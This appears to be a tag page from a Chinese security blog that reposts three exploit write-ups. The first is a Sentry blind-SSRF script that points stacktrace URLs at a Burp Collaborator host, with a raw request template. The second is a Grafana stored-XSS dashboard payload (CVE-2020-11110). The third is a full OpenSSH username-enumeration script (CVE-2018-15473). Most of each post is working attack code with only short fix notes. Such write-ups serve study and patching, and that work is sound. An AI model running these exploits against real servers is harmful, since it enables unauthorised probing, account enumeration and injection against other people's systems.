<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Tag: Reprint | æ°•æ°˜æ°š</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="æ°•æ°˜æ°š">
<meta property="og:url" content="https://szczecin.github.io/tags/Reprint/page/3/index.html">
<meta property="og:site_name" content="æ°•æ°˜æ°š">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        
  <section class="page-header tag">
    <h1>- <span>Reprint</span> -</h1>
  </section>






<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/Sentry-SSRF/">
                Sentry SSRF
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
<p>Sentry æ˜¯ä¸€ä¸ªå®æ—¶çš„äº‹ä»¶æ—¥å¿—å’Œèšåˆå¹³å°ï¼ŒåŸºäº Django æ„å»ºã€‚ä¸€èˆ¬åœ¨urlä¸Šã€æˆ–è€…logoä¸Šçœ‹åˆ°æœ‰sentryéƒ½å¯ä»¥ç”¨å®ƒçš„expè¯•è¯•ï¼ŒåŸç†æ˜¯ç”±äºsentryé»˜è®¤å¼€å¯source code scrapping ï¼Œå¯¼è‡´å¯ä»¥ä»å¤–éƒ¨è¿›è¡Œblind ssrfè¯·æ±‚ã€‚</p>
</blockquote>
<h2><span id="exp-testing">exp testing</span></h2><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) âœ  sentrySSRF git:(master) python sentrySSRF.py -i http://ã€your target urlã€‘ -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@ã€your target urlã€‘/1</span><br><span class="line">Enter your burpcollaborator address:ã€your dnslogã€‘</span><br></pre></td></tr></table></figure>

<p>ç„¶åå»ä½ åˆ°dnslogçœ‹çœ‹æœ‰æ²¡æœ‰è¯·æ±‚è®°å½•å³å¯ã€‚</p>
<p>expæºç å‚è€ƒï¼š<br>é…ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=ã€your</span> keyã€‘ <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> ã€your <span class="string">target</span> urlã€‘.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:ã€éšæ„domainã€‘</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://ã€your dnslogã€‘&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
<p>sentry_version &#x3D; çº¢çº¿2 ï¼ˆæŠ¥é”™å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹å‡ ä¸ªå…¶ä»–ç‰ˆæœ¬è¯•è¯•ï¼‰<br>sentry_key &#x3D; Raven.config çº¢çº¿1<br>origin &#x3D; å¯ä»¥éšä¾¿å†™</p>
</blockquote>
<h2><span id="repair">Repair</span></h2><blockquote>
<p>1ã€sentryå…³é—­ source code scrappingï¼›<br>2ã€ä¿è¯é…ç½®æ–‡ä»¶ä¸­çš„é»‘åå•ä¸ä¸ºç©ºï¼š&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
</blockquote>
<h2><span id="reference">Reference</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
                Grafana å­˜å‚¨å‹XSSæ¼æ´ï¼ˆCVE-2020-11110ï¼‰
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="grafana-å­˜å‚¨å‹xssæ¼æ´cve-2020-11110">Grafana å­˜å‚¨å‹XSSæ¼æ´ï¼ˆCVE-2020-11110ï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="preface">Preface</span></h2><blockquote>
<p>Grafanaæ˜¯ä¸€ä¸ªè·¨å¹³å°ã€å¼€æºçš„æ•°æ®å¯è§†åŒ–ç½‘ç»œåº”ç”¨ç¨‹åºå¹³å°ã€‚ç”¨æˆ·é…ç½®è¿æ¥çš„æ•°æ®æºä¹‹åï¼ŒGrafanaå¯ä»¥åœ¨ç½‘ç»œæµè§ˆå™¨é‡Œæ˜¾ç¤ºæ•°æ®å›¾è¡¨å’Œè­¦å‘Šã€‚Grafana å­˜åœ¨æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹å¯é€šè¿‡è¯¥æ¼æ´è¯»å–ä¸»æœºä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVEç¼–å·ï¼š</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">å½±å“èŒƒå›´ï¼š</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="å¤ç°è®°å½•">å¤ç°è®°å½•</span></h2><h3><span id="æµ‹è¯•ç¯å¢ƒéƒ¨ç½²">æµ‹è¯•ç¯å¢ƒéƒ¨ç½²</span></h3><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
</blockquote>
<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
<p>æ›¿æ¢ url ä¸­çš„ localhostï¼Œè®¿é—®å¿«ç…§åœ°å€ï¼Œç‚¹å‡»é“¾æ¥ğŸ”—å›¾æ ‡ã€‚ Stored-XSSã€‚</p>
<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
</blockquote>
<h3><span id="snapshot-å¿«ç…§åˆ é™¤">snapshot å¿«ç…§åˆ é™¤</span></h3><blockquote>
<p>è®¿é—® deleteUrlï¼š</p>
<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
<p>å¯ä»¥åˆ é™¤ snapshotï¼Œè¿™é‡Œç®—æ˜¯ä¸ªä¸¥é‡ç¨‹åº¦æ›´é«˜çš„æ¼æ´ã€‚</p>
</blockquote>
<h2><span id="ä¿®å¤æ–¹æ¡ˆ">ä¿®å¤æ–¹æ¡ˆ</span></h2><blockquote>
<p>ç‰ˆæœ¬å‡çº§ã€‚</p>
</blockquote>
<h2><span id="refer">Refer</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
<p>ä»¥ä¸Šï¼</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
                OpenSSHç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•ï¼ˆCVE-2018-15473ï¼‰
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="opensshç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•cve-2018-15473">OpenSSHç”¨æˆ·åæšä¸¾åŠå…¶æ£€æµ‹æ–¹æ³•ï¼ˆCVE-2018-15473ï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> å¹¶ä½œè¡¥å……</p>
<p>OpenSSH 7.7å‰åœ¨æ¥æ”¶åˆ°ç•¸å½¢çš„è®¤è¯è¯·æ±‚åŒ…æ—¶ï¼Œä¼šæ ¹æ®ç”¨æˆ·åçš„å­˜åœ¨ä¸å¦ç»™å‡ºä¸åŒçš„å“åº”ï¼Œç”±æ­¤å¯¼è‡´é€šè¿‡SSHæœåŠ¡æšä¸¾æœåŠ¡å™¨çš„ç”¨æˆ·åã€‚</p>
</blockquote>
<h3><span id="ssh-check-usernamepy-ä½¿ç”¨è¯´æ˜">ssh-check-username.py ä½¿ç”¨è¯´æ˜</span></h3><blockquote>
<ul>
<li>å®‰è£…ä¾èµ–åŒ… <code>pip install paramiko==2.0.8</code></li>
<li>è¯­æ³•ï¼š<code>python ssh_checkusername.py ip username â€“port 22</code></li>
</ul>
</blockquote>
<h3><span id="è„šæœ¬">è„šæœ¬</span></h3><blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="éªŒè¯è¯´æ˜">éªŒè¯è¯´æ˜ï¼š</span></h2><blockquote>
<p>å¦‚æœæœåŠ¡å™¨å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
<p>å¦‚æœæœåŠ¡å™¨ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Invalid username</code><br> å¦‚æœå‡çº§sshç‰ˆæœ¬ä¹‹åï¼š</p>
<p>å¦‚æœæœåŠ¡å™¨å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
<p>å¦‚æœæœåŠ¡å™¨ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œåˆ™è„šæœ¬ä¼šè¿”å›<code>Valid username</code></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
